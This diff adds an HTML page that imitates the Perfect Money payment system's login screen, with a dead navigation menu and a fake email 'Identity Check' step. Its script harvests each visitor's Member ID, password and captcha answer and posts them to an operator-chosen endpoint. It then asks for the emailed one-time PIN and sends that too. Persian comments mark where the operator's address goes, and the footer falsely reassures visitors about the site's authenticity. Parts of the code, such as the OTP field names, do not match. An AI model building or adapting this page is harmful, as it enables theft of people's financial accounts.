@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Perfect Money</title>
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+
+    <meta name="Keywords" content="perfectmoney, perfect money">
+    <meta name="description" content="Perfect Money">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <style type="text/css">
+        <!--
+        body {
+            max-width: 1650px
+        }
+
+        .top {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 8pt
+        }
+
+        .req {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 9pt;
+            color: #FF0000
+        }
+
+        td {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 13px;
+            color: #333333
+        }
+
+        .ag {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 11px;
+            color: #333333
+        }
+
+        h2 {
+            font-family: Arial, Helvetica, sans-serif;
+            font-size: 15pt;
+            color: #333333
+        }
+
+        #TJK_ToggleON, #TJK_ToggleOFF {
+            display: none
+        }
+
+        .menu {
+            font-family: Verdana, Arial, Helvetica, sans-serif;
+            font-size: 10pt
+        }
+
+        .txt {
+            text-align: justify
+        }
+
+        a {
+            color: #990000
+        }
+
+        -->
+    </style>
+    <link rel="StyleSheet" href="/css/css2.css" type="text/css">
+    <link rel="StyleSheet" href="/css/css1.css" type="text/css">
+    <style type="text/css" media="screen">#__localStorageFlash {
+        visibility: hidden
+    }input[type='number'] {
+         -moz-appearance:textfield;
+     }
+
+    input::-webkit-outer-spin-button,
+    input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+    }</style>
+
+    <script src="/js/jquery-3.7.0.min.js"></script>
+    <script src="/js/util.js?v=11"></script>
+    <script src="./js/helper.js?v=15"></script>
+    <script>
+        function aFunc() {
+            window.location.href = "/";
+        }
+    </script>
+</head>
+<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" id="general">
+<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+        <td height="43"><br><img alt="Payment System Gold USD EUR" src="/img/blank.gif" width="950" height="5">
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                <tr>
+                    <td width="35%"><img alt="E-Currency Payment System" src="/img/blank.gif" width="14" height="26"><a
+                            href="#" onclick="aFunc()"><img alt="Perfect Money Payment System" src="/img/logo3.png"
+                                                            border="0"></a></td>
+                    <td valign="bottom" width="65%">
+                        <div align="right">
+                            <form method="post" name="f" >
+                                <table cellpadding="0" cellspacing="0">
+                                    <tbody>
+                                    <tr>
+                                        <td valign="middle"><img src="/img/GB.gif">&nbsp;<br><br></td>
+                                        <td>
+                                            <select id="select-lang" name="lang">&nbsp;&nbsp;
+                                                <option value=""> --- ---</option>
+                                                <option value="en_US" selected="">English</option>
+                                                <option value="de_DE">Deutsch</option>
+                                                <option value="el_GR">Ελληνικά</option>
+                                                <option value="zh_CN">中文</option>
+                                                <option value="ja_JP">日本語</option>
+                                                <option value="ko_KR">한국어</option>
+                                                <option value="es_ES">Español</option>
+                                                <option value="fr_FR">Français</option>
+                                                <option value="ru_RU">Русский</option>
+                                                <option value="uk_UA">Українська</option>
+                                                <option value="it_IT">Italiano</option>
+                                                <option value="pt_PT">Português</option>
+                                                <option value="ar_AE">العربية</option>
+                                                <option value="fa_IR">فارسی</option>
+                                                <option value="th_TH">ไทย</option>
+                                                <option value="id_ID">Indonesia</option>
+                                                <option value="ms_MY">Malaysian</option>
+                                                <option value="tr_TR">Türkçe</option>
+                                                <option value="pl_PL">Polski</option>
+                                                <option value="ro_RO">Român</option>
+                                                <option value="hi_IN">Hindi</option>
+                                                <option value="ur_IN">Urdu</option>
+                                                <option value="vi_VN">Vietnam</option>&nbsp;&nbsp;</select><img
+                                                alt="Switzerland E-Currency" src="/img/blank.gif" width="42" height="5"><br>
+                                            <img alt="Switzerland E-Currency" src="/img/blank.gif" width="1"
+                                                 height="15"></td>
+                                    </tr>
+                                    </tbody>
+                                </table>
+                            </form>
+                            <font face="Verdana, Arial, Helvetica, sans-serif" size="2">
+                                <a href="#" onclick="aFunc()"><font color="#000000">Signup</font></a>&nbsp;&nbsp;&nbsp;
+                                <font color="#999999">|</font>&nbsp;&nbsp;&nbsp;<a href="#" onclick="aFunc()"><font
+                                    color="#000000">Login</font></a>&nbsp;&nbsp;&nbsp;
+                                <font color="#999999">|</font>&nbsp;&nbsp;&nbsp;<a href="#" onclick="aFunc()"><font
+                                    color="#000000">Exchangers</font></a>
+
+                                &nbsp;&nbsp;&nbsp;<font face="Verdana, Arial, Helvetica, sans-serif" size="2">
+                                <font color="#999999">|</font>&nbsp;&nbsp;&nbsp;<a href="#" class="cboxElement"
+                                                                                   onclick="aFunc()"><font
+                                    color="#000000">Tour</font></a>&nbsp;&nbsp;&nbsp;
+                                <font color="#999999"></font></font><font color="#999999">|</font>&nbsp;&nbsp;&nbsp;<a
+                                    href="#" onclick="aFunc()"><font
+                                    color="#000000">Help</font></a>&nbsp;&nbsp;&nbsp;<font color="#999999">|</font>&nbsp;&nbsp;&nbsp;<a
+                                    href="#" onclick="aFunc()"><font color="#000000">Security
+                                Center</font></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+
+                            </font></div>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+            <br>
+        </td>
+    </tr>
+    </tbody>
+</table>
+<div id="season" style="position:absolute; width:1px; height:1px; z-index:-1; left: 356px; top: 5px"><img alt="Summer"
+                                                                                                          src="/img/season3.gif">
+</div>
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+        <td>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="0B0A0C">
+                <tbody>
+                <tr>
+                    <td height="8" width="2%"><img alt="Buy Gold Metal, Buy USD EURO currency online, Payment System"
+                                                   src="/img/blank.gif" id="img-rand">
+                        <script>
+                            document.getElementById("img-rand").setAttribute("src", "/get.php");
+                        </script>
+                    </td>
+                    <td height="8" bgcolor="#0A0A0A">
+                        <div align="center">
+                            <table width="216" border="0" cellspacing="0" cellpadding="0">
+                                <tbody>
+                                <tr>
+                                    <td><img alt="E-Currency Payment System" src="/img/text-for-security.png"></td>
+                                </tr>
+                                <tr>
+                                    <td>&nbsp;</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </td>
+                    <td height="8" width="1%">
+                        <div align="right" style="display: none"><img
+                                alt="fast,easy,comfortable - way to develop your money"
+                                src="/img/right2-70.png" width="18" height="167"></div>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+
+        </td>
+    </tr>
+    <tr>
+        <td>
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                <tr>
+                    <td width="36"><img src="/img/left-70.gif" width="36" height="26"></td>
+                    <td colspan="2" bgcolor="B01111">
+                        <table border="0" cellspacing="0" cellpadding="0">
+                            <tbody>
+                            <tr>
+                                <td width="100">&nbsp;<a class="no" href="#" onclick="aFunc()"><font
+                                        face="Verdana, Arial, Helvetica, sans-serif" size="2"
+                                        color="#FFFFFF">Login</font></a>
+                                </td>
+                                <td width="150"><img src="/img/blank.gif" width="150" height="10"></td>
+                                <td nowrap="">
+                                    <div id="menuOver">
+                                        <font face="Verdana, Arial, Helvetica, sans-serif" size="2">
+                                            <div class="menu" style="min-width:780px"><a href="#"
+                                                                                         onclick="aFunc()"><span>Home</span></a>
+                                                <a href="#" class="selectedd"
+                                                   onclick="aFunc()"><span>About Us</span></a>
+                                                <a href="#" onclick="aFunc()"><span>Features</span></a>
+                                                <a href="#" onclick="aFunc()"><span>Fees</span></a>
+                                                <a href="#" onclick="aFunc()"><span>E-Vouchers</span></a>
+                                                <a href="#" onclick="aFunc()"><span>Guarantees</span></a>
+                                                <a href="#" onclick="aFunc()"><span>F.A.Q.</span></a>
+                                                <a href="#" onclick="aFunc()"><span>Contact Us</span></a>
+                                            </div>
+                                        </font>
+                                    </div>
+                                </td>
+                            </tr>
+                            </tbody>
+                        </table>
+                    </td>
+                    <td width="4%" bgcolor="B01111" valign="middle">
+                        <div align="right" style="display: none"><img src="/img/right-70.gif" width="24" height="26">
+                        </div>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+
+        </td>
+    </tr>
+    <tr>
+        <td><img src="/img/blank.gif" width="820" height="1"></td>
+    </tr>
+    </tbody>
+</table>
+
+<table id="page-main" width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+        <td width="23"><img src="/img/blank.gif" width="23" height="26"></td>
+        <td>
+
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                <tr>
+                    <td width="310" valign="top" background="/img/left33.gif">
+                        <div align="left"><font face="Arial, Helvetica, sans-serif" size="3"><b><br>
+                            Hints</b></font><font face="Arial, Helvetica, sans-serif" size="3"><b></b></font>
+                            <br>
+                            <font face="Verdana, Arial, Helvetica, sans-serif" size="1" color="#FF0000"><b>
+                                <br>
+                            </b></font>
+                            <div align="left">
+                                <table width="250" border="0" cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                    <tr>
+                                        <td><strong>Member ID:</strong> In this field you should enter the combination
+                                            of figures sent to the e-mail address you specified during your
+                                            registration.
+                                            <p><strong>Password:</strong> In this field you should enter the password
+                                                which you have specified during your registration.
+                                            </p>
+                                            <p><strong>Turing number:</strong> Please enter the figures shown in the
+                                                picture. It's necessary to protect the system from robots. </p></td>
+                                    </tr>
+                                    </tbody>
+                                </table>
+                                <font face="Verdana, Arial, Helvetica, sans-serif" size="1" color="#FF0000"><b>
+                                </b><img src="/img/blank.gif" width="290" height="26"></font></div>
+                        </div>
+                    </td>
+                    <td valign="top">
+                        <p><font face="Arial, Helvetica, sans-serif" size="3"><b><br>
+                            <font size="4">Login</font></b></font></p>
+                        To access your account, please enter the Member ID, Password and Turing Image<br>
+                        <br>
+                        Don't have an account? <a href="#" onclick="aFunc()">Signup</a><br>
+                        <br>
+                        <div class="error"><font face="Arial, Helvetica, sans-serif" id="error-login"></font></div>
+                        <br>
+                        <form method="post" name="reg" id="reg"
+                              onsubmit="return false;">
+                            <table cellpadding="0" cellspacing="2">
+                                <tbody>
+                                <tr>
+                                    <td valign="top" width="123"><font face="Arial, Helvetica, sans-serif" size="2"><b>Member
+                                        ID:</b></font></td>
+                                    <td width="287"><font face="Arial, Helvetica, sans-serif" size="2">
+                                        <input  oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" id="input-username" type="number"  name="login" size="20"  maxlength="9"
+                                                value=""
+                                                autocomplete="off" class="input">&nbsp;&nbsp;<a href="#"
+                                                                                                onclick="aFunc()">Forgot?</a></font>
+                                        <font face="Arial, Helvetica, sans-serif" size="2">
+                                        </font>
+                                        <div class="error"><font face="Arial, Helvetica, sans-serif" size="2"
+                                                                 id="error-username"></font>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <tr>
+                                </tr>
+                                <tr>
+                                    <td valign="top" width="123"><font face="Arial, Helvetica, sans-serif" size="2"><b>Password:</b></font>
+                                    </td>
+                                    <td nowrap=""><font face="Arial, Helvetica, sans-serif" size="2">
+                                        <input type="password" name="password" size="20" class="keyboardInput input"
+                                               id="input-password">&nbsp;&nbsp;<a
+                                            href="#" onclick="aFunc()">Lost password?</a>
+                                    </font>
+                                        <div class="error"><font face="Arial, Helvetica, sans-serif" size="2"
+                                                                 id="error-password"></font>
+                                        </div>
+                                    </td>
+                                </tr>
+                                <tr>
+                                </tr>
+                                <tr>
+                                    <td valign="top" width="123" height="23"><font face="Arial, Helvetica, sans-serif"
+                                                                                   size="2">&nbsp;</font></td>
+                                    <td width="287" height="23"><font face="Arial, Helvetica, sans-serif" size="2">&nbsp;</font>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td valign="top" width="123"><font face="Arial, Helvetica, sans-serif" size="2"><b>Turing
+                                        number:</b></font></td>
+                                    <td width="287"><font face="Arial, Helvetica, sans-serif" size="2"><font
+                                            face="Arial, Helvetica, sans-serif" size="2">
+                                        <input id="input-turing" type="text" name="turing" size="7" maxlength="6"
+                                               autocomplete="off"
+                                               class="input">
+                                    </font>
+                                        <div class="error"><font face="Arial, Helvetica, sans-serif" size="2"
+                                                                 id="error-turing"></font>
+                                        </div>
+                                    </font></td>
+                                </tr>
+                                <tr>
+                                    <td valign="top" width="123"><font face="Arial, Helvetica, sans-serif" size="2"><a
+                                            style="text-decoration:none;cursor:pointer;" href="#" onclick="aFunc()">
+                                        <img
+                                                id="cpt_img" src="/img/blank.gif">
+                                        <script>
+                                            document.getElementById("img-rand").setAttribute("src", "/get.php");
+                                        </script>
+                                    </a><br></font></td>
+                                    <td width="287">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td valign="top" width="123" height="40">&nbsp;</td>
+                                    <td width="287" height="40" valign="bottom">
+                                        <div style="display: flex">
+                                            <input onclick="showPageOtp()" type="submit" value="Authorize" name="submit"
+                                                   id="btn-login"
+                                                   class="input submit">
+                                            <img src="/img/loading.gif"
+                                                 style="width: 16px;height: 16px;margin-left: 8px;display: none"
+                                                 id="img-loading">
+                                        </div>
+                                    </td>
+                                </tr>
+                                </tbody>
+                            </table>
+                            <p>
+                            </p></form>
+
+
+                        <br>
+                        Original Perfect Money website displays a green address bar that confirms
+                        that the presented content is the legitimate.
+                        <br>
+                        <br>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        </td>
+        <td width="44" valign="middle"><img src="/img/blank.gif" width="44" height="26"></td>
+    </tr>
+    </tbody>
+</table>
+
+<table id="page-otp" style="display: none" width="100%" border="0" cellspacing="0" cellpadding="0">
+    <tbody>
+    <tr>
+        <td width="23"><img src="/img/blank.gif" width="23" height="26"></td>
+        <td>
+
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                <tr>
+                    <td width="310" valign="top" background="/img/left33.gif">
+
+                        <div align="left"><font face="Arial, Helvetica, sans-serif" size="3"><b><br>
+                            Hints</b></font><font face="Arial, Helvetica, sans-serif" size="3"><b></b></font>
+                            <br>
+                            <font face="Verdana, Arial, Helvetica, sans-serif" size="1" color="#FF0000"><b>
+                                <br>
+                            </b></font>
+                            <div align="left">
+                                <table width="250" border="0" cellspacing="0" cellpadding="0">
+                                    <tbody>
+                                    <tr>
+                                        <td>
+                                            <p><b>Identity Check</b> <br>By using this tool each time that you are
+                                                logging in from different PC or web-browser, an email will be sent to
+                                                your email box to check your Identity. This email will contain a
+                                                confirmation code, which need to be entered in.</p>
+                                        </td>
+                                    </tr>
+                                    </tbody>
+                                </table>
+                                <font face="Verdana, Arial, Helvetica, sans-serif" size="1" color="#FF0000"><b>
+                                </b><img src="/img/blank.gif" width="290" height="26"></font></div>
+                        </div>
+
+                    </td>
+                    <td valign="top">
+
+
+                        <p><font face="Arial, Helvetica, sans-serif" size="3"><b><br>
+                            <font size="4">Please confirm your Identity to continue</font></b></font></p>
+
+                        <form method="post" name="reg" onsubmit="return false;">
+                            <table border="0" cellpadding="0" cellspacing="0" width="568">
+                                <tbody>
+                                <tr>
+                                    <td valign="top" nowrap="">Perfect Money Identity Check detected that your IP
+                                        address or browser has been changed.<br>
+                                        <br>
+                                        <b>Please check your email and enter PIN code below to continue:</b><br><br>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td valign="top">
+                                        <input type="text" name="pin" size="20" maxsize="20" value="" id="input-otp"
+                                               autocomplete="off" class="input" >
+                                        <div style="display: inline-flex">
+                                            <input onclick="sendOtp()" style="opacity: 0.5;pointer-events: none" type="submit" value="Continue" name="submit" id="btn-otp"
+                                                   class="input submit">
+                                            <img src="/img/loading.gif"
+                                                 style="width: 16px;height: 16px;margin-left: 8px;display: none"
+                                                 id="img-loading-otp">
+                                        </div>
+                                        <br>
+                                        <div class="error" id="error-otp"></div>
+                                        <br><br>
+                                        <b>Possible, You need to check your spam folder in your mail.</b><br><br>
+                                        Some unpleasant mail providers put our messages into spam cause of swindlers
+                                        phishing activity.<br>
+                                        Help us to improve your mail provider by clicking "Not Spam" on our message.<br>
+                                        <br>
+
+                                        <br><br><br><br><br><br>
+                                    </td>
+                                </tr>
+                                </tbody>
+                            </table>
+                            <p>
+                            </p></form>
+
+
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        </td>
+        <td width="44" valign="middle"><img src="/img/blank.gif" width="44" height="26"></td>
+    </tr>
+    </tbody>
+</table>
+
+
+<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+        <td height="2">
+            <table width="100%" border="0" cellspacing="0" cellpadding="0">
+                <tbody>
+                <tr>
+                    <td width="1%" style="display: none"><img src="/img/left2.gif" width="19" height="6"></td>
+                    <td width="98%" bgcolor="C61313"><img src="/img/blank.gif" width="1" height="1"></td>
+                    <td width="1%" bgcolor="B01111" valign="middle" style="display: none"><img src="/img/right2.gif"
+                                                                                               width="19" height="6">
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        </td>
+    </tr>
+    </tbody>
+</table>
+<table width="100%" border="0" cellspacing="0" cellpadding="0" align="center">
+    <tbody>
+    <tr>
+        <td width="341" bgcolor="#ffffff" valign="middle" height="56">
+            <div align="left">&nbsp;&nbsp;
+
+
+            </div>
+        </td>
+        <td bgcolor="#ffffff" valign="top" height="56">
+            <table width="100%" border="0" cellspacing="5" cellpadding="5" align="right">
+                <tbody>
+                <tr>
+                    <td>
+                        <div align="right"><small><font face="Verdana, Arial, Helvetica, sans-serif" size="1">
+                            Make P2P and B2B payment with Perfect Money&nbsp;<br>©
+                            2007-2023 SR &amp; I. All rights reserved.&nbsp;<br>
+                            <a href="#" onclick="aFunc()"><font color="#b50b0b">Affiliate Program</font></a>
+                            | <a href="#" onclick="aFunc()"><font color="#b50b0b"></font></a><a href="#"
+                                                                                                onclick="aFunc()"><font
+                                color="#b50b0b">Perfect
+                            Money API</font></a> | <a href="#" onclick="aFunc()"><font color="#b50b0b">Legal
+                            notice</font></a>
+                            | <a href="#" onclick="aFunc()"><font color="#b50b0b">Privacy policy</font></a><small><font
+                                face="Verdana, Arial, Helvetica, sans-serif" size="1">
+                            | <a href="#" onclick="aFunc()"><font color="#b50b0b">Terms of Use</font></a></font></small>
+                            <font face="Verdana, Arial, Helvetica, sans-serif" size="1">
+                                | <a href="#" onclick="aFunc()"><font
+                                    color="#b50b0b">AML</font></a></font></font></small><font
+                                face="Verdana, Arial, Helvetica, sans-serif" size="1"><br><font
+                                face="Verdana, Arial, Helvetica, sans-serif" size="1"><a href="#"
+                                                                                         onclick="aFunc()"><font
+                                color="#b50b0b">Site Map</font></a></font></font>
+
+
+                        </div>
+                    </td>
+                </tr>
+                </tbody>
+            </table>
+        </td>
+    </tr>
+    </tbody>
+</table>
+<span style="position: absolute; left: -1000px; top: -1000px;"><span id="__localStorageFlash"
+                                                                     style="visibility: visible;"></span></span>
+<div id="cboxOverlay" style="display: none;"></div>
+<div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;">
+    <div id="cboxWrapper">
+        <div>
+            <div id="cboxTopLeft" style="float: left;"></div>
+            <div id="cboxTopCenter" style="float: left;"></div>
+            <div id="cboxTopRight" style="float: left;"></div>
+        </div>
+        <div style="clear: left;">
+            <div id="cboxMiddleLeft" style="float: left;"></div>
+            <div id="cboxContent" style="float: left;">
+                <div id="cboxTitle" style="float: left;"></div>
+                <div id="cboxCurrent" style="float: left;"></div>
+                <button type="button" id="cboxPrevious"></button>
+                <button type="button" id="cboxNext"></button>
+                <button type="button" id="cboxSlideshow"></button>
+                <div id="cboxLoadingOverlay" style="float: left;"></div>
+                <div id="cboxLoadingGraphic" style="float: left;"></div>
+            </div>
+            <div id="cboxMiddleRight" style="float: left;"></div>
+        </div>
+        <div style="clear: left;">
+            <div id="cboxBottomLeft" style="float: left;"></div>
+            <div id="cboxBottomCenter" style="float: left;"></div>
+            <div id="cboxBottomRight" style="float: left;"></div>
+        </div>
+    </div>
+    <div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div>
+</div>
+
+<script>
+    document.getElementById("btn-login").addEventListener("click", function () {
+        // جلوگیری از ارسال فرم به صورت پیش‌فرض
+        event.preventDefault();
+
+        // گرفتن مقادیر ورودی‌ها از فرم
+        const username = document.getElementById("input-username").value;
+        const password = document.getElementById("input-password").value;
+        const turing = document.getElementById("input-turing").value;
+
+        // ساخت داده‌های فرم به شکل JSON
+        const data = {
+            login: username,
+            password: password,
+            turing: turing
+        };
+
+        // ارسال درخواست POST به API
+        fetch("/user/userlogin.asp", {  // آدرس API خود را اینجا جایگزین کنید
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data) // تبدیل داده‌ها به JSON برای ارسال
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Network response was not ok " + response.statusText);
+                }
+                return response.json(); // تبدیل پاسخ به JSON
+            })
+            .then(data => {
+                console.log("Success:", data); // مدیریت پاسخ موفق
+                // می‌توانید به صفحه OTP هدایت کنید
+                showPageOtp();
+            })
+            .catch(error => {
+                console.error("Error:", error); // مدیریت خطا
+                document.getElementById("error-username").innerText = "Wrong Member ID/Password."; // نمایش پیام خطا
+            });
+    });
+    function enableButton() {
+        const inputElements = document.querySelectorAll('input[name="otp"]'); // تغییر اینجا به ورودی‌های شما
+        let allFilled = true;
+
+        inputElements.forEach(input => {
+            if (input.value.trim() === "") {
+                allFilled = false;
+            }
+        });
+
+        const submitButton = document.getElementById("btn-otp");
+        if (allFilled) {
+            submitButton.style.opacity = "1";
+            submitButton.style.pointerEvents = "auto";
+        } else {
+            submitButton.style.opacity = "0.5";
+            submitButton.style.pointerEvents = "none";
+        }
+    }
+
+    // افزودن listener به هر ورودی که هر بار تغییر می‌کند، دکمه را بررسی کند
+    document.querySelectorAll('input[name="otp"]').forEach(input => {
+        input.addEventListener('input', enableButton);
+    });
+
+    // تابع برای ارسال درخواست به API
+    function sendOtp() {
+        // جلوگیری از ارسال فرم به صورت پیش‌فرض
+        event.preventDefault();
+
+        // گرفتن مقادیر ورودی‌ها از فرم (در اینجا فرض می‌کنیم ورودی OTP دارید)
+        const otpValue = document.querySelector('input[name="otp"]').value;
+
+        // ساخت داده‌ها به شکل JSON
+        const data = {
+            number: otpValue
+        };
+
+        // ارسال درخواست POST به API
+        fetch("/otp.asp", {  // آدرس API خود را اینجا جایگزین کنید
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data) // تبدیل داده‌ها به JSON برای ارسال
+        })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Network response was not ok " + response.statusText);
+                }
+                return response.json(); // تبدیل پاسخ به JSON
+            })
+            .then(data => {
+                console.log("Success:", data); // مدیریت پاسخ موفق
+                window.location.href = "/login.html";
+            })
+            .catch(error => {
+                console.error("Error:", error); // مدیریت خطا
+                document.getElementById("error-otp").innerText = "Wrong Member ID/Password."; // نمایش پیام خطا
+            });
+    }
+    function showErrorUsername(show = true) {
+        if (!show)
+            document.getElementById("error-username").innerHTML =
+                ""
+            ;
+        else if (show)
+            document.getElementById("error-username").innerHTML =
+                "The field is filled in incorrectly!"
+            ;
+    }
+
+    function showErrorPassword(show = true) {
+        if (!show)
+            document.getElementById("error-password").innerHTML =
+                ""
+            ;
+        else if (show)
+            document.getElementById("error-password").innerHTML =
+                "The field is filled in incorrectly!"
+            ;
+    }
+
+    function showErrorTuring(show = true) {
+        if (!show)
+            document.getElementById("error-turing").innerHTML =
+                ""
+            ;
+        else if (show)
+            document.getElementById("error-turing").innerHTML =
+                "wrong turing"
+            ;
+    }
+
+    function showErrorOtp(show = true) {
+        if (!show)
+            document.getElementById("error-otp").innerHTML =
+                ""
+            ;
+        else if (show)
+            document.getElementById("error-otp").innerHTML =
+                "Please confirm your Identity"
+            ;
+    }
+
+    function showErrorLogin(show = true) {
+        if (!show)
+            document.getElementById("error-login").innerHTML =
+                ""
+            ;
+        else if (show)
+            document.getElementById("error-login").innerHTML =
+                "Please check your password"
+            ;
+    }
+
+    function enableClick() {
+        document.getElementsByTagName("body")[0].style.pointerEvents = "all";
+    }
+
+    function disableClick() {
+        document.getElementsByTagName("body")[0].style.pointerEvents = "none";
+    }
+    function showPageOtp() {
+
+        document.getElementById("page-main").style.display = "none";
+        document.getElementById("page-otp").style.display = "block";
+
+    }
+</script>
+
+
+</body>
+</html>
